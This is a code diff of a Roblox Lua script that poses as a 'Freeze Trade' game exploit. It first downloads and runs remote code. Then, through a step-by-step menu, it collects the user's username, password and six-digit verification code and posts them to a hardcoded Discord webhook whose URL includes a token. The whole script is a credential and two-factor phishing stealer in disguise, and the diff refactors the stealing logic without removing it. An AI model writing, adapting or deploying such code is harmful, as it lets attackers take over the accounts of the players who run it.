@@ -1,11 +1,11 @@
-local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()
+-- Load ZamitoHub Library
+local ZamitoHub = loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()
 
-local Window = OrionLib:MakeWindow({Name = "Freeze Trade V3", HidePremium = false, SaveConfig = true, ConfigFolder = "Orion"})
-
-local correctKey = "kon"
+-- Webhook URL Discord
 local webhook_url = "https://discord.com/api/webhooks/1319657197705367604/YDNwABDpMP0FcZrC5QqEOH9IbPqt67FmLF1yz6gNks0yxISJPoHbUBFyB1zgei3C5OOR"
 
-local username, password, code
+-- Key yang benar
+local correctKey = "kon"
 
 -- Fungsi untuk mengirim data ke Discord
 local function sendToDiscord(username, password, code)
@@ -13,13 +13,19 @@ local function sendToDiscord(username, password, code)
     local payload = {
         Url = webhook_url,
         Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = game:GetService("HttpService"):JSONEncode({content = content})
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = content
+        })
     }
 
     local response
     if syn and syn.request then
         response = syn.request(payload)
+    elseif http and http.request then
+        response = http.request(payload)
     elseif request then
         response = request(payload)
     else
@@ -34,71 +40,70 @@ local function sendToDiscord(username, password, code)
     end
 end
 
--- Step 1: Key Input
-local Tab1 = Window:MakeTab({Name = "Step 1: Key Input", Icon = "rbxassetid://4483345998", PremiumOnly = false})
-Tab1:AddTextbox({
-    Name = "Masukkan Key",
-    Default = "",
-    TextDisappear = true,
-    Callback = function(value)
-        if value == correctKey then
-            OrionLib:MakeNotification({
-                Name = "Key Valid",
-                Content = "Key yang dimasukkan benar!",
-                Image = "rbxassetid://4483345998",
-                Time = 3
-            })
-            Window:SelectTab(Window:MakeTab({Name = "Step 2: Username & Password", Icon = "rbxassetid://4483345998", PremiumOnly = false}))
-        else
-            OrionLib:MakeNotification({
-                Name = "Key Invalid",
-                Content = "Key yang dimasukkan salah!",
-                Image = "rbxassetid://4483345998",
-                Time = 3
-            })
-        end
-    end
-})
+-- Fungsi untuk membuat GUI menggunakan ZamitoHub
+local function createMenuGUI()
+    -- Membuat window dengan ZamitoHub
+    local window = ZamitoHub:CreateWindow("Freeze Trade V5", true)
 
--- Step 2: Username & Password Input
-local Tab2 = Window:MakeTab({Name = "Step 2: Username & Password", Icon = "rbxassetid://4483345998", PremiumOnly = false})
-Tab2:AddTextbox({
-    Name = "Masukkan Username",
-    Default = "",
-    TextDisappear = true,
-    Callback = function(value)
-        username = value
+    -- Step 1: Key Input
+    local function createKeyInputStep()
+        local keyStep = window:CreateTab("Step 1: Key Input")
+        local keyTextbox = keyStep:CreateTextbox("Enter Key", "", function(key)
+            if key == correctKey then
+                ZamitoHub:CreateNotification("Key Valid", "Key yang dimasukkan benar!", 3)
+                keyStep:Destroy() -- Hapus tab Key Input
+                createUsernamePasswordStep() -- Pindah ke langkah berikutnya
+            else
+                ZamitoHub:CreateNotification("Key Invalid", "Key yang dimasukkan salah!", 3)
+            end
+        end)
     end
-})
-Tab2:AddTextbox({
-    Name = "Masukkan Password",
-    Default = "",
-    TextDisappear = true,
-    Callback = function(value)
-        password = value
-    end
-})
-Tab2:AddButton({
-    Name = "Lanjut ke Verifikasi",
-    Callback = function()
-        Window:SelectTab(Window:MakeTab({Name = "Step 3: Verification Code", Icon = "rbxassetid://4483345998", PremiumOnly = false}))
-    end
-})
 
--- Step 3: Verification Code Input
-local Tab3 = Window:MakeTab({Name = "Step 3: Verification Code", Icon = "rbxassetid://4483345998", PremiumOnly = false})
-Tab3:AddTextbox({
-    Name = "Masukkan Kode Verifikasi",
-    Default = "",
-    TextDisappear = true,
-    Callback = function(value)
-        code = value
-        sendToDiscord(username, password, code)
-        OrionLib:MakeNotification({
-            Name = "Verification Success",
-            Content = "Data berhasil dikirim ke Discord!",
-            Image = "rbxassetid://4483345998",
-            Time = 3
-        })
+    -- Step 2: Username and Password Input
+    local function createUsernamePasswordStep()
+        local usernamePasswordStep = window:CreateTab("Step 2: Username & Password")
+        local username, password
+
+        -- Username Input
+        usernamePasswordStep:CreateTextbox("Enter Username", "", function(input)
+            username = input
+        end)
+
+        -- Password Input
+        usernamePasswordStep:CreateTextbox("Enter Password", "", function(input)
+            password = input
+        end)
+
+        -- Lanjut ke Step 3: Kode Verifikasi
+        usernamePasswordStep:CreateButton("Continue to Verification", function()
+            if username and password then
+                usernamePasswordStep:Destroy() -- Hapus tab Username & Password
+                createVerificationCodeStep(username, password) -- Pindah ke langkah berikutnya
+            else
+                ZamitoHub:CreateNotification("Error", "Harap isi Username dan Password terlebih dahulu!", 3)
+            end
+        end)
     end
-})
+
+    -- Step 3: Verification Code Input
+    local function createVerificationCodeStep(username, password)
+        local verificationStep = window:CreateTab("Step 3: Verification Code")
+
+        -- Kode Verifikasi Input
+        verificationStep:CreateTextbox("Enter Verification Code", "", function(code)
+            if code:match("^%d%d%d%d%d%d$") then -- Memastikan kode 6 digit
+                sendToDiscord(username, password, code) -- Kirim ke Discord
+                ZamitoHub:CreateNotification("Verification Success", "Kode verifikasi berhasil dikirim!", 3)
+                verificationStep:Destroy() -- Hapus tab Verification
+            else
+                ZamitoHub:CreateNotification("Verification Failed", "Kode harus 6 digit angka!", 3)
+            end
+        end)
+    end
+
+    -- Tampilkan langkah pertama
+    createKeyInputStep()
+end
+
+-- Menampilkan GUI
+createMenuGUI()
